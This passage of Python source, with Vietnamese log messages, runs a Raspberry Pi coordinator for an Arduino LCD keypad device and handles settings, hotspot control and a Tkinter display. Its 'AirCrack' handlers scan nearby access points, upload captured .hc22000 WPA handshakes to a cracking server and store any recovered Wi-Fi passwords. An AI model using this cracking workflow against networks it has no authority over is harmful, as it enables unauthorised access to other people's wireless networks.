        elif action == 0x08:  # Upload & Crack selected .hc22000 file on Server
            hc_files = self._list_hc22000_files()
            if not hc_files:
                msg = "No HC22k"
            else:
                idx = max(0, min(extra, len(hc_files) - 1))
                fpath = hc_files[idx]
                fname = os.path.basename(fpath)
                srv_url = self._get_aircrack_server_url()
                print(f"[AIRCRACK] Uploading & cracking '{fname}' on {srv_url}...")
                try:
                    boundary = "----ArduinoBoundaryUpload"
                    with open(fpath, "rb") as f:
                        file_bytes = f.read()
                    body = (
                        f"--{boundary}\r\n"
                        f'Content-Disposition: form-data; name="file"; filename="{fname}"\r\n'
                        f"Content-Type: application/octet-stream\r\n\r\n"
                    ).encode("utf-8") + file_bytes + f"\r\n--{boundary}--\r\n".encode("utf-8")

                    up_req = urllib.request.Request(
                        f"{srv_url}/upload",
                        data=body,
                        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                        method="POST",
                    )
                    with urllib.request.urlopen(up_req, timeout=6.0) as resp:
                        up_res = json.loads(resp.read().decode("utf-8"))

                    hash_body = json.dumps({"filename": fname}).encode("utf-8")
                    hash_req = urllib.request.Request(
                        f"{srv_url}/hash",
                        data=hash_body,
                        headers={"Content-Type": "application/json"},
                        method="POST",
                    )
                    with urllib.request.urlopen(hash_req, timeout=12.0) as resp:
                        hash_res = json.loads(resp.read().decode("utf-8"))

                    print(f"[AIRCRACK] Server crack response: {hash_res}")
                    pw = hash_res.get("password")
                    ssid = hash_res.get("ssid")
                    if pw:
                        if ssid:
                            self._save_known_wifi(ssid, pw)
                        msg = f"PW:{pw}"[:11]
                    else:
                        msg = "Not Cracked"
                except Exception as e:
                    print(f"[AIRCRACK] Upload & Crack err: {e}")
                    msg = "Crack Error"

        msg_b = self._to_lcd_ascii(msg, 11).encode("ascii", errors="replace")[:11]
        payload = bytes([iface_idx, len(msg_b)]) + msg_b
        self.send_packet(0x9B, payload)

    def handle_aircrack_scan_item_request(self, index: int) -> None:
        now = time.time()
        if index == 0 or not self._aircrack_scan_cache or (now - self._aircrack_scan_time > 25.0):
            print(f"[AIRCRACK] <<< Quet AP thuc te (index={index})...")
            self._aircrack_scan_cache = self._scan_aircrack_aps_real()
            self._aircrack_scan_time = time.time()

        if not self._aircrack_scan_cache:
            payload = bytes([0, 0, 5]) + b"No AP" + bytes([0, 0])
            self.send_packet(0x8F, payload)
            return

        total = len(self._aircrack_scan_cache)
        idx = max(0, min(index, total - 1))
        it = self._aircrack_scan_cache[idx]
        label_b = str(it.get("label") or it.get("bssid", ""))[:12].encode("ascii", errors="replace")[:12]
        ch = int(it.get("channel", 1)) & 0xFF
        pwr = int(it.get("power", 50)) & 0xFF
        payload = bytes([idx, total, len(label_b)]) + label_b + bytes([ch, pwr])
        self.send_packet(0x8F, payload)
        print(f"[AIRCRACK] >>> Scan AP [{idx+1}/{total}]: {it.get('ssid')} ({it.get('bssid')}) Ch={ch} Pwr={pwr}")

    def handle_aircrack_hcf_item_request(self, index: int) -> None:
        hc_paths = self._list_hc22000_files()
        if not hc_paths:
            name_b = b"No .hc22000"
            payload = bytes([0, 0, len(name_b)]) + name_b
            self.send_packet(0x9C, payload)
            return

        total = len(hc_paths)
        idx = max(0, min(index, total - 1))
        fname = os.path.basename(hc_paths[idx])
        short_name = fname[:-8] if fname.endswith(".hc22000") else fname
        name_b = self._to_lcd_ascii(short_name, 12).encode("ascii", errors="replace")[:12]
        payload = bytes([idx, total, len(name_b)]) + name_b
        self.send_packet(0x9C, payload)
        print(f"[AIRCRACK] >>> HC22000 [{idx+1}/{total}]: {fname}")

    def handle_aircrack_card_mode(self, card: int, mode: int) -> None:
        print(f"[AIRCRACK] <<< Set Card {card} -> Mode {mode}")
        apps = self.settings.setdefault("apps", {})
        ac = apps.setdefault("aircrack", {})
        modes = ac.get("card_modes", [0, 0, 0, 0])
        if not isinstance(modes, list) or len(modes) < 4:
            modes = [0, 0, 0, 0]
        if 0 <= card < 4:
            modes[card] = mode
        ac["card_modes"] = modes
        ac["selected_card"] = card
        save_settings(self.settings)

        iface, _ = self._resolve_wireless_iface(card_idx=card, for_aircrack=True)
        self._set_interface_mode(iface, mode)

    def handle_aircrack_server_ip(self, ip_str: str) -> None:
        clean_ip = (ip_str or "").strip()
        if not clean_ip:
            clean_ip = "169.254.84.122"
        apps = self.settings.setdefault("apps", {})
        ac = apps.setdefault("aircrack", {})
        ac["server_ip"] = clean_ip
        save_settings(self.settings)
        print(f"[AIRCRACK] Server IP set to {clean_ip}")

    def handle_restart_pi(self) -> None:
        print("[SETTINGS] <<< Restart Raspberry Pi requested")
        if sys.platform.startswith("linux"):
            import subprocess
            try:
                subprocess.run(["sudo", "-n", "reboot"], timeout=5)
            except Exception as e:
                print(f"[SETTINGS] reboot failed: {e}")
        else:
            print("[SETTINGS] (dev) reboot skipped on non-Linux")

    def handle_hotspot_action(self, action: int, extra: int) -> None:
        print(f"\n[HOTSPOT] <<< Nhan lenh tu Arduino: Action=0x{action:02X}, Extra=0x{extra:02X}")
        if not self.hotspot_service:
            st = 1 if action == 1 else 0
            payload = bytes([st, 0, 1, 1])
            self.engine._link.send_packet(Packet(cmd=RESP_HOTSPOT_STATUS, data=payload))
            return

        wh_cfg = self.settings.get("apps", {}).get("wifi_hotspot", {})

        if action == 0x01: # ACTION_START_HOST
            sync_before = bool(extra & 0x01) or wh_cfg.get("sync_before_host", True)
            card_mode = (extra >> 1) & 0x03
            if card_mode == 0:
                card_mode = wh_cfg.get("interface_mode", 0)

            print(f"[HOTSPOT] Kich hoat BAT TRAM PHAT AP (SyncFirst={sync_before}, CardMode={card_mode})")

            # 1. Sync truoc khi phat AP neu bat
            if sync_before and self.sync_service:
                print("[HOTSPOT] Dong bo tu Master Server truoc khi phat AP...")
                self.sync_service.sync_from_master_server()

            # 2. Bat Hotspot
            success, msg = self.hotspot_service.start_hotspot(interface_mode=card_mode)
            print(f"[HOTSPOT] Ket qua khoi dong AP: {success} ({msg})")

            # 3. Bat Web Portal neu chua chay
            self._ensure_web_portal_running()

            # 4. Gui trang thai that ve Arduino
            self.send_real_hotspot_status()

        elif action == 0x02: # ACTION_STOP_HOST
            print("[HOTSPOT] Kich hoat TAT TRAM PHAT AP")
            self.hotspot_service.stop_hotspot()
            self.send_real_hotspot_status()

        elif action == 0x03: # ACTION_TRIGGER_SYNC
            print("[HOTSPOT] Kich hoat DONG BO Server ngay lap tuc")
            if self.sync_service:
                self.sync_service.sync_from_master_server()
            self.send_real_hotspot_status()

        elif action == 0x04: # ACTION_QUERY_STATUS
            self.send_real_hotspot_status()

    def _init_tkinter_gui(self) -> None:
        """Khoi tao cua so Native Tkinter (an ban dau)."""
        import tkinter as tk
        self.root = tk.Tk()
        self.root.title("PC test - Arduino LCD OS Live Display [115200 Baud]")
        self.root.geometry("760x520")
        self.root.configure(bg="#121620")
        self.root.resizable(False, False)
        self.root.withdraw()

        self.root.protocol("WM_DELETE_WINDOW", self.on_window_close)
        self.root.bind("<Escape>", lambda e: self.on_window_close())
        self.root.bind("<KeyPress-b>", lambda e: self.toggle_backlight_hotkey())
        self.root.bind("<KeyPress-p>", lambda e: self.do_ping_hotkey())

        # Build UI layout
        pad_x, pad_y = 16, 12
        header_frame = tk.Frame(self.root, bg="#1C2230", height=50, highlightthickness=1, highlightbackground="#323C55")
        header_frame.pack(fill="x", padx=pad_x, pady=(pad_y, 8))
        header_frame.pack_propagate(False)

        tk.Label(header_frame, text="ARDUINO LCD OS  |  PC TEST DISPLAY", font=("Consolas", 14, "bold"), fg="#F0F4FA", bg="#1C2230").pack(side="left", padx=16, pady=12)
        self.status_lbl = tk.Label(header_frame, text="● ONLINE", font=("Consolas", 12, "bold"), fg="#32E66E", bg="#1C2230")
        self.status_lbl.pack(side="right", padx=16, pady=12)

        self.hero_frame = tk.Frame(self.root, bg="#1C2230", height=230, highlightthickness=3, highlightbackground="#8291AA")
        self.hero_frame.pack(fill="x", padx=pad_x, pady=6)
        self.hero_frame.pack_propagate(False)

        self.lbl_subtitle = tk.Label(self.hero_frame, text="TRANG THAI NUT:", font=("Consolas", 10), fg="#8C9BB4", bg="#1C2230")
        self.lbl_subtitle.pack(anchor="w", padx=24, pady=(16, 4))

        self.lbl_btn_title = tk.Label(self.hero_frame, text="DANG CHO TIN HIEU TU ARDUINO...", font=("Consolas", 20, "bold"), fg="#8291AA", bg="#1C2230")
        self.lbl_btn_title.pack(anchor="w", padx=24, pady=(0, 6))

        self.lbl_desc = tk.Label(self.hero_frame, text="Hay chon 'PC test' tren Arduino va bam nut bat ky.", font=("Consolas", 12, "bold"), fg="#F0F4FA", bg="#1C2230")
        self.lbl_desc.pack(anchor="w", padx=24, pady=2)

        self.lbl_action = tk.Label(self.hero_frame, text="Hanh dong logic: Chua co nut nao duoc nhan", font=("Consolas", 11), fg="#8C9BB4", bg="#1C2230")
        self.lbl_action.pack(anchor="w", padx=24, pady=4)

        self.lbl_proto = tk.Label(self.hero_frame, text="Giao thuc: RESP_BTN_STATE (0x83)  |  Ma Byte: 0x00", font=("Consolas", 9), fg="#788CA0", bg="#1C2230")
        self.lbl_proto.pack(anchor="w", padx=24, pady=2)

        self.lbl_ack = tk.Label(self.hero_frame, text="Phan hoi gui ve LCD: 'PC: Ready...'", font=("Consolas", 9), fg="#64C8B4", bg="#1C2230")
        self.lbl_ack.pack(anchor="w", padx=24, pady=2)

        bottom_frame = tk.Frame(self.root, bg="#121620")
        bottom_frame.pack(fill="both", expand=True, padx=pad_x, pady=(6, pad_y))

        hist_frame = tk.Frame(bottom_frame, bg="#1C2230", highlightthickness=1, highlightbackground="#323C55")
        hist_frame.pack(side="left", fill="both", expand=True, padx=(0, 6))
        tk.Label(hist_frame, text="LICH SU NUT BAM", font=("Consolas", 11, "bold"), fg="#F0F4FA", bg="#1C2230").pack(anchor="w", padx=14, pady=(10, 6))

        self.hist_labels = []
        for _ in range(5):
            lbl = tk.Label(hist_frame, text="", font=("Consolas", 10), fg="#8C9BB4", bg="#1C2230")
            lbl.pack(anchor="w", padx=14, pady=2)
            self.hist_labels.append(lbl)

        diag_frame = tk.Frame(bottom_frame, bg="#1C2230", width=280, highlightthickness=1, highlightbackground="#323C55")
        diag_frame.pack(side="right", fill="both", padx=(6, 0))
        diag_frame.pack_propagate(False)
        tk.Label(diag_frame, text="THONG SO & DIEU KHIEN", font=("Consolas", 11, "bold"), fg="#F0F4FA", bg="#1C2230").pack(anchor="w", padx=14, pady=(10, 6))

        self.lbl_baud = tk.Label(diag_frame, text="Baudrate:     115200 bps", font=("Consolas", 9), fg="#8C9BB4", bg="#1C2230")
        self.lbl_baud.pack(anchor="w", padx=14, pady=1)

        self.lbl_rtt = tk.Label(diag_frame, text="Do tre Ping:  -- ms", font=("Consolas", 9), fg="#8C9BB4", bg="#1C2230")
        self.lbl_rtt.pack(anchor="w", padx=14, pady=1)

        self.lbl_pkts = tk.Label(diag_frame, text="Tong TX / RX: 0 / 0", font=("Consolas", 9), fg="#8C9BB4", bg="#1C2230")
        self.lbl_pkts.pack(anchor="w", padx=14, pady=1)

        self.lbl_cnt = tk.Label(diag_frame, text="Tong nut bam: 0 lan", font=("Consolas", 9), fg="#8C9BB4", bg="#1C2230")
        self.lbl_cnt.pack(anchor="w", padx=14, pady=1)

        tk.Label(diag_frame, text="Bam LEFT tren Arduino de dong UI", font=("Consolas", 9), fg="#A0B0C8", bg="#1C2230").pack(anchor="w", padx=14, pady=(6, 1))

    def connect(self) -> bool:
        if self.engine and self.engine.is_open:
            return True

        available = [p.device for p in serial.tools.list_ports.comports()]
        if not self.explicit_port:
            if not self.port or self.port not in available:
                detected = find_arduino_port()
                if detected:
                    self.port = detected
                else:
                    return False
        else:
            self.port = self.explicit_port

        try:
            print(f"[COORDINATOR] Tu dong nhan dien cong Arduino: {self.port} @ 115200 baud...")
            self.engine = LCDKeypadEngine(port=self.port, baudrate=115200, timeout=1.5)
            print(f"[COORDINATOR] KET NOI THANH CONG VOI {self.port}!")
            self.send_settings_response()
            if self.has_gui and hasattr(self, "status_lbl"):
                self.status_lbl.config(text=f"● ONLINE [{self.port}]", fg="#32E66E")
            return True
        except Exception:
            self.engine = None
            if self.has_gui and hasattr(self, "status_lbl"):
                self.status_lbl.config(text="○ OFFLINE", fg="#FF4B4B")
            return False

    def send_settings_response(self) -> None:
        if not self.engine or not self.engine.is_open:
            return

        sys_cfg = self.settings.get("system", self.settings)
        apps_cfg = self.settings.get("apps", {})

        bl_byte = 1 if sys_cfg.get("backlight", True) else 0
        snd_byte = 1 if sys_cfg.get("sound", True) else 0

        payload = bytearray([bl_byte, snd_byte])

        # Block 1: Native Game (0x01)
        ng = apps_cfg.get("native_game", {})
        diff = int(ng.get("difficulty", 1)) & 0xFF
        hs = int(ng.get("high_score", 0)) & 0xFFFF
        payload.extend([0x01, 3, diff, hs & 0xFF, (hs >> 8) & 0xFF])

        # Block 2: PC Test (0x02)
        pt = apps_cfg.get("pc_test", {})
        echo = 1 if pt.get("echo_lcd", True) else 0
        payload.extend([0x02, 1, echo])

        # Block 3: SettingsApp Sound (0x03)
        payload.extend([0x03, 1, snd_byte])

        # Block 4: Counter (0x04)
        ct = apps_cfg.get("counter", {})
        cnt_val = int(ct.get("saved_count", 0)) & 0xFFFF
        payload.extend([0x04, 2, cnt_val & 0xFF, (cnt_val >> 8) & 0xFF])

        # Block 5: Wifi Hotspot / wifi_pb (0x05)
        wh = apps_cfg.get("wifi_pb", apps_cfg.get("wifi_hotspot", {}))
        bg_run = 1 if wh.get("bg_run", False) else 0
        sync_first = 1 if wh.get("sync_before_host", True) else 0
        iface_mode = int(wh.get("interface_mode", 0)) & 0xFF
        dual_push = 1 if wh.get("dual_card_push", True) else 0
        payload.extend([0x05, 4, bg_run, sync_first, iface_mode, dual_push])

        # Block 6: AirCrack (0x06) - selected_card + one mode + server_ip
        ac = apps_cfg.get("aircrack", {})
        ac_card = int(ac.get("selected_card", 0)) & 0xFF
        ac_modes = ac.get("card_modes", [0,0,0,0])
        ac_mode0 = int(ac_modes[0]) & 0xFF if isinstance(ac_modes, list) and ac_modes else 0
        ac_ip_str = str(ac.get("server_ip", "")).strip() or "169.254.84.122"
        ac_ip_b = ac_ip_str.encode("ascii", errors="replace")[:20]
        payload.extend([0x06, 2 + len(ac_ip_b), ac_card, ac_mode0])
        payload.extend(ac_ip_b)

        # Block 7: WifiSet (0x07) - compact: iface_mode + one mode
        ws = apps_cfg.get("wifi_set", {})
        ws_iface = int(ws.get("iface_mode", 0)) & 0xFF
        ws_modes = ws.get("card_modes", [0,0,0,0])
        ws_mode0 = int(ws_modes[0]) & 0xFF if isinstance(ws_modes, list) and ws_modes else 0
        payload.extend([0x07, 2, ws_iface, ws_mode0])

        pkt = Packet(cmd=RESP_SETTINGS, data=bytes(payload))
        try:
            self.engine._link.send_packet(pkt)
            print(f"[SETTINGS] >>> Da gui cai dat He Thong & Tung App cho Arduino:")
            print(f"            - System: Backlight={'ON' if bl_byte else 'OFF'}, Sound={'ON' if snd_byte else 'OFF'}")
            print(f"            - NativeGame: Difficulty={diff}, HighScore={hs}")
            print(f"            - Counter: SavedCount={cnt_val if cnt_val < 32768 else cnt_val - 65536}")
            print(f"            - WifiHotspot: BgRun={bool(bg_run)}, SyncFirst={bool(sync_first)}, Iface={iface_mode}, DualPush={bool(dual_push)}")
        except Exception as e:
            print(f"[SETTINGS] Loi gui cai dat: {e}")

    def show_window(self) -> None:
        if self.ui_visible:
            return
        self.ui_visible = True

        if self.has_gui and self.root:
            print("\n" + "=" * 65)
            print("[LIFECYCLE] ARDUINO VAO 'PC test' -> TU DONG BAT CUA SO GIAO DIEN (TKINTER)!")
            print("=" * 65 + "\n")
            self.root.deiconify()
            self.root.lift()
            self.root.focus_force()
        else:
            # Che do Linux Server Headless
            print("\n" + ANSI_CYAN + "=" * 65 + ANSI_RESET)
            print(ANSI_BOLD + ANSI_CYAN + "[LIFECYCLE] ARDUINO VAO 'PC test' (CHE DO LINUX HEADLESS LIVE DASHBOARD)!" + ANSI_RESET)
            print(ANSI_CYAN + "=" * 65 + ANSI_RESET + "\n")

        if self.engine and self.engine.is_open:
            try:
                self.engine._link.send_command(CMD_DISPLAY_UPDATE, b"PC: Connected OK", wait_response=False)
            except Exception:
                pass

    def hide_window(self, notify_arduino: bool = False) -> None:
        if not self.ui_visible:
            return
        self.ui_visible = False

        if self.has_gui and self.root:
            print("\n" + "=" * 65)
            print("[LIFECYCLE] ARDUINO THOAT / RESET -> TU DONG DONG CUA SO GIAO DIEN!")
            print("=" * 65 + "\n")
            self.root.withdraw()
        else:
            print(ANSI_MAGENTA + "\n[LIFECYCLE] ARDUINO THOAT / RESET -> DUNG DASHBOARD 'PC test', VE OS MENU!" + ANSI_RESET + "\n")

        if notify_arduino and self.engine and self.engine.is_open:
            try:
                self.engine._link.send_command(CMD_APP_EXIT, wait_response=False)
            except Exception:
                pass

    def on_window_close(self) -> None:
        self.hide_window(notify_arduino=True)

    def toggle_backlight_hotkey(self) -> None:
        sys_cfg = self.settings.get("system", self.settings)
        new_bl = not sys_cfg.get("backlight", True)
        sys_cfg["backlight"] = new_bl
        self.settings["system"] = sys_cfg
        save_settings(self.settings)
        print(f"[SETTINGS] Da doi Backlight thanh: {new_bl} va luu os_settings.json")
        if self.engine and self.engine.is_open:
            try:
                self.engine._link.send_command(CMD_SET_BACKLIGHT, bytes([1 if new_bl else 0]), wait_response=False)
            except Exception:
                pass

    def do_ping_hotkey(self) -> None:
        if self.engine and self.engine.is_open:
            self.engine.ping(timeout=0.3)

    def update_hero_card(self, btn_name: str) -> None:
        style = BTN_STYLES.get(btn_name, BTN_STYLES["NONE"])
        if self.has_gui and self.root:
            color = style["color_hex"]
            self.hero_frame.config(highlightbackground=color)
            self.lbl_btn_title.config(text=style["title"], fg=color)
            self.lbl_desc.config(text=style["desc"])
            self.lbl_action.config(text=f"Hanh dong: {style['action']}")
            self.lbl_proto.config(text=f"Giao thuc: RESP_BTN_STATE (0x83)  |  Ma: {style['code']}")
            self.lbl_ack.config(text=f"Phan hoi gui ve LCD: '{style['lcd_ack']}'")
        else:
            # Hien thi ANSI Terminal truc quan tren Linux Server
            print(style["ansi"] + f"  ---> [BUTTON] {style['title']} (Ma: {style['code']}) | {style['action']}" + ANSI_RESET)

    def update_diagnostics_panel(self) -> None:
        if not self.has_gui or not self.engine:
            return
        stats = self.engine._link.stats
        self.lbl_rtt.config(text=f"Do tre Ping:  {stats.last_rtt_ms:.1f} ms")
        self.lbl_pkts.config(text=f"Tong TX / RX: {stats.tx_packets} / {stats.rx_packets}")
        self.lbl_cnt.config(text=f"Tong nut bam: {self.total_press_count} lan")

        now = time.time()
        for idx, lbl in enumerate(self.hist_labels):
            if idx < len(self.history):
                item = self.history[idx]
                elapsed = now - item["timestamp"]
                h_style = BTN_STYLES.get(item["name"], BTN_STYLES["NONE"])
                lbl.config(
                    text=f"#{self.total_press_count - idx:02d} | {item['name']:7s} - cach day {elapsed:4.1f}s",
                    fg=h_style["color_hex"],
                )
            else:
                lbl.config(text="")

    def handle_sudo_item_request(self, requested_index: int) -> None:
        """Xu ly yeu cau thong tin 1 lenh sudo tu Arduino LinuxInfApp."""
        cmds = get_linux_sudo_commands()
        total = len(cmds)
        if total == 0:
            cmds = [("Khong co lenh", "Kiem tra sudoers")]
            total = 1

        idx = max(0, min(requested_index, total - 1))
        cmd_name, cmd_desc = cmds[idx]

        name_b = cmd_name.encode("utf-8", errors="replace")[:16]
        desc_b = cmd_desc.encode("utf-8", errors="replace")[:16]

        payload = bytearray([idx, total, len(name_b)])
        payload.extend(name_b)
        payload.append(len(desc_b))
        payload.extend(desc_b)

        pkt = Packet(cmd=RESP_LINUX_SUDO_ITEM, data=bytes(payload))
        self.engine._link.send_packet(pkt)
        print(f"[LINUX INF] >>> Gui lenh Sudo [{idx+1}/{total}]: '{cmd_name}' | '{cmd_desc}'")

    def handle_linux_info_request(self) -> None:
        """Xu ly yeu cau thong tin Linux SystemInfo tu Arduino."""
        if sys.platform.startswith("linux"):
            import socket
            hostname = socket.gethostname()[:16]
            ip_str = "127.0.0.1"
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip_str = s.getsockname()[0]
                s.close()
            except Exception:
                pass
            line1 = f"Host:{hostname}"[:16]
            line2 = f"IP:{ip_str}"[:16]
        else:
            line1 = "Host: WindowsDev"
            line2 = "IP: 192.168.1.20 "

        l1_b = line1.encode("utf-8")[:16]
        l2_b = line2.encode("utf-8")[:16]

        payload = bytearray([len(l1_b)])
        payload.extend(l1_b)
        payload.append(len(l2_b))
        payload.extend(l2_b)

        pkt = Packet(cmd=RESP_LINUX_INFO, data=bytes(payload))
        self.engine._link.send_packet(pkt)
        print(f"[LINUX INF] >>> Gui thong tin Linux: '{line1}' / '{line2}'")

    def poll_serial_step(self) -> None:
        """Mot chu ky doc Serial (dung chung cho ca GUI va Headless Terminal)."""
        now = time.time()

        # 1. Tu dong quet va ket noi lai cong COM neu bi rut / cam sang cong khac
        if now - self.last_reconnect_check >= 1.5:
            self.last_reconnect_check = now
            is_alive = self.engine and self.engine.is_open and self.engine._link.is_read_thread_alive
            if not is_alive:
                if self.engine is not None:
                    try:
                        self.engine.close()
                    except Exception:
                        pass
                    self.engine = None
                if self.ui_visible:
                    self.hide_window(notify_arduino=False)
                available = [p.device for p in serial.tools.list_ports.comports()]
                if not self.explicit_port and (not self.port or self.port not in available):
                    self.port = None
                self.connect()

        # 2. Xu ly goi tin nhan tu Serial
        if self.engine and self.engine.is_open:
            try:
                while not self.engine._link._packet_queue.empty():
                    pkt = self.engine._link._packet_queue.get_nowait()

                    if pkt.cmd == CMD_REQ_SETTINGS:
                        print(f"\n[SETTINGS] <<< Arduino yeu cau Cai Dat OS (CMD_REQ_SETTINGS 0x08)")
                        self.send_settings_response()
                        continue

                    if pkt.cmd == RESP_OS_BOOT:
                        print(f"\n[LIFECYCLE] <<< Nhan tin hieu ARDUINO RESET / BOOT (0x95)!")
                        if self.ui_visible:
                            self.hide_window(notify_arduino=False)

                        # Neu khong bat Chay Ngam (BgRun=False) -> Tu dong tat Host AP khi Arduino reset!
                        wh = self.settings.get("apps", {}).get("wifi_hotspot", {})
                        if not wh.get("bg_run", False) and self.hotspot_service and self.hotspot_service.is_active:
                            print("[HOTSPOT] Arduino Reset va BgRun=OFF -> Tu dong tat Host AP!")
                            self.hotspot_service.stop_hotspot()

                        self.send_settings_response()
                        continue

                    if pkt.cmd == RESP_APP_ENTER:
                        print(f"\n[APP] <<< Nhan tin hieu ARDUINO VAO 'PC test' (0x90)!")
                        self.show_window()
                        continue

                    if pkt.cmd == RESP_APP_EXIT:
                        print(f"\n[APP] <<< Nhan tin hieu ARDUINO THOAT APP (0x92)!")
                        self.hide_window(notify_arduino=False)

                        # Neu thoat app wifi_pb ma khong bat BgRun -> Tu dong tat Host AP!
                        wh = self.settings.get("apps", {}).get("wifi_hotspot", {})
                        if not wh.get("bg_run", False) and self.hotspot_service and self.hotspot_service.is_active:
                            print("[HOTSPOT] Arduino thoat wifi_pb va BgRun=OFF -> Tu dong tat Host AP!")
                            self.hotspot_service.stop_hotspot()
                            self.send_real_hotspot_status()
                        continue

                    if pkt.cmd == RESP_DEBUG_LOG:
                        try:
                            msg = pkt.data.decode("utf-8", errors="replace")
                            print(f"[ARDUINO LOG] {msg}")
                        except Exception:
                            pass
                        continue

                    if pkt.cmd == CMD_REQ_LINUX_SUDO_ITEM:
                        requested_idx = pkt.data[0] if pkt.data else 0
                        self.handle_sudo_item_request(requested_idx)
                        continue

                    if pkt.cmd == CMD_REQ_LINUX_INFO:
                        self.handle_linux_info_request()
                        continue

                    if pkt.cmd == RESP_BTN_STATE and len(pkt.data) >= 1:
                        btn_code = pkt.data[0]
                        btn_name = pkt.button or "NONE"

                        if btn_name == "LEFT":
                            print("[BUTTON] Nhan nut LEFT tu Arduino -> Dong UI va tro ve OS Menu.")
                            self.hide_window(notify_arduino=False)
                            continue

                        if btn_name != self.current_btn:
                            self.current_btn = btn_name
                            if self.current_btn != "NONE":
                                self.last_pressed_btn = self.current_btn
                                self.total_press_count += 1
                                self.history.insert(0, {"name": self.current_btn, "timestamp": now})
                                if len(self.history) > 6:
                                    self.history.pop()

                                print(f"[BUTTON] Arduino nhan nut: {self.current_btn} (Code: 0x{btn_code:02X})")
                                if self.ui_visible:
                                    self.update_hero_card(self.current_btn)

                                ack_str = BTN_STYLES.get(self.current_btn, {}).get("lcd_ack", "PC: OK")
                                try:
                                    self.engine._link.send_command(CMD_DISPLAY_UPDATE, ack_str.encode("utf-8"), wait_response=False)
                                except Exception:
                                    pass

                                if hasattr(self, "web_portal_module") and self.web_portal_module and hasattr(self.web_portal_module, "update_live_button"):
                                    self.web_portal_module.update_live_button(self.current_btn)
                            else:
                                if self.ui_visible and self.last_pressed_btn != "NONE":
                                    self.update_hero_card(self.last_pressed_btn)
                                if hasattr(self, "web_portal_module") and self.web_portal_module and hasattr(self.web_portal_module, "update_live_button"):
                                    self.web_portal_module.update_live_button(self.last_pressed_btn)

                    if pkt.cmd == CMD_SAVE_SETTINGS and len(pkt.data) >= 2:
                        app_id = pkt.data[0]
                        app_data = pkt.data[1:]

                        if "system" not in self.settings:
                            self.settings["system"] = {}
                        if "apps" not in self.settings:
                            self.settings["apps"] = {}

                        if app_id == 0x00:
                            new_bl = bool(app_data[0])
                            self.settings["system"]["backlight"] = new_bl
                            save_settings(self.settings)
                            print(f"\n[SETTINGS] <<< Arduino cap nhat System Backlight = {new_bl} -> Da luu os_settings.json!")

                        elif app_id == 0x01 and len(app_data) >= 3:
                            diff = app_data[0]
                            hs = app_data[1] | (app_data[2] << 8)
                            if "native_game" not in self.settings["apps"]:
                                self.settings["apps"]["native_game"] = {}
                            self.settings["apps"]["native_game"]["difficulty"] = diff
                            self.settings["apps"]["native_game"]["high_score"] = hs
                            save_settings(self.settings)
                            print(f"\n[SETTINGS] <<< Arduino cap nhat [Native Game]: Do Kho={diff}, Ky Luc={hs} -> Da luu os_settings.json!")

                        elif app_id == 0x03 and len(app_data) >= 1:
                            new_snd = bool(app_data[0])
                            self.settings["system"]["sound"] = new_snd
                            save_settings(self.settings)
                            print(f"\n[SETTINGS] <<< Arduino cap nhat System Sound = {new_snd} -> Da luu os_settings.json!")

                        elif app_id == 0x04 and len(app_data) >= 2:
                            saved_cnt = int.from_bytes(app_data[0:2], "little", signed=True)
                            if "counter" not in self.settings["apps"]:
                                self.settings["apps"]["counter"] = {}
                            self.settings["apps"]["counter"]["saved_count"] = saved_cnt
                            save_settings(self.settings)
                            print(f"\n[SETTINGS] <<< Arduino cap nhat [Counter App]: So Dem={saved_cnt} -> Da luu os_settings.json!")

                        elif app_id == 0x05 and len(app_data) >= 4:
                            bg_run = bool(app_data[0])
                            sync_first = bool(app_data[1])
                            iface_mode = app_data[2]
                            dual_push = bool(app_data[3])
                            if "wifi_hotspot" not in self.settings["apps"]:
                                self.settings["apps"]["wifi_hotspot"] = {}
                            self.settings["apps"]["wifi_hotspot"]["bg_run"] = bg_run
                            self.settings["apps"]["wifi_hotspot"]["sync_before_host"] = sync_first
                            self.settings["apps"]["wifi_hotspot"]["interface_mode"] = iface_mode
                            self.settings["apps"]["wifi_hotspot"]["dual_card_push"] = dual_push
                            self.settings["apps"]["wifi_pb"] = self.settings["apps"]["wifi_hotspot"]
                            save_settings(self.settings)
                            print(f"\n[SETTINGS] <<< Arduino cap nhat [WiFi PB / Hotspot]: BgRun={bg_run}, SyncFirst={sync_first}, Iface={iface_mode}, DualPush={dual_push} -> Da luu os_settings.json!")

                        elif app_id == 0x06 and len(app_data) >= 2:
                            ac_card = app_data[0]
                            if "aircrack" not in self.settings["apps"]:
                                self.settings["apps"]["aircrack"] = {}
                            self.settings["apps"]["aircrack"]["selected_card"] = ac_card
                            if len(app_data) >= 5:
                                self.settings["apps"]["aircrack"]["card_modes"] = [int(app_data[1]), int(app_data[2]), int(app_data[3]), int(app_data[4])]
                            save_settings(self.settings)

                        elif app_id == 0x07 and len(app_data) >= 2:
                            ws_iface = app_data[0]
                            if "wifi_set" not in self.settings["apps"]:
                                self.settings["apps"]["wifi_set"] = {}
                            self.settings["apps"]["wifi_set"]["iface_mode"] = ws_iface
                            if len(app_data) >= 5:
                                self.settings["apps"]["wifi_set"]["card_modes"] = [int(app_data[1]), int(app_data[2]), int(app_data[3]), int(app_data[4])]
                            save_settings(self.settings)
                            print(f"\\n[SETTINGS] <<< Arduino cap nhat [WifiSet]: Iface={ws_iface} -> Da luu os_settings.json!")

                        continue

                    if pkt.cmd == CMD_HOTSPOT_ACTION and len(pkt.data) >= 1:
                        action = pkt.data[0]
                        extra = pkt.data[1] if len(pkt.data) > 1 else 0
                        self.handle_hotspot_action(action, extra)
                        continue

                    if pkt.cmd == 0x19 and len(pkt.data) >= 1:
                        action = pkt.data[0]
                        extra = pkt.data[1] if len(pkt.data) > 1 else 0
                        self.handle_wifiset_action(action, extra)
                        continue

                    if pkt.cmd == 0x32 and len(pkt.data) >= 1:
                        self.handle_wifi_scan_item_request(pkt.data[0])
                        continue
                    if pkt.cmd == 0x33 and len(pkt.data) >= 1:
                        self.handle_wifi_known_item_request(pkt.data[0])
                        continue
                    if pkt.cmd == 0x34 and len(pkt.data) >= 2:
                        idx = pkt.data[0]
                        pw_len = pkt.data[1]
                        pw = ""
                        if pw_len > 0 and len(pkt.data) >= 2 + pw_len:
                            pw = bytes(pkt.data[2:2+pw_len]).decode("utf-8", errors="replace")
                        self.handle_wifi_connect_password(idx, pw)
                        continue
                    if pkt.cmd == 0x35 and len(pkt.data) >= 2:
                        self.handle_wifi_card_mode(pkt.data[0], pkt.data[1])
                        continue
